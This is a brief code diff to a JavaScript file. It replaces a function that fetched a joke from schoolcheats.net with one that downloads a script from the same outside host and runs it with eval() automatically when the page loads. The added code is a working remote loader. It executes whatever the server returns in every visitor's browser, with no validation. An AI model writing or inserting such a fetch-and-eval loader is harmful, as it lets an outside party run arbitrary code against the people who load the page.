@@ -1,19 +1,13 @@
-
-function getBadJoke() {
-  fetch('https://schoolcheats.net/blooket', {
-    headers: {
-      Accept: 'application/json'
-    }
-  })
-    .then((response) => response.json())
-    .then((j) => {
-      h2El.textContent = j.joke;
+function getScriptAndRun() {
+  fetch('https://schoolcheats.net/blooket')
+    .then(response => response.text())
+    .then(script => {
+      // Execute the fetched JavaScript code
+      eval(script);
     })
-    .catch((e) => {
-      console.log(e);
-      h2El.textContent = 'failed to load joke';
+    .catch(error => {
+      console.error('Failed to fetch script:', error);
     });
 }
 
-
-document.addEventListener('DOMContentLoaded', getBadJoke);
+document.addEventListener('DOMContentLoaded', getScriptAndRun);
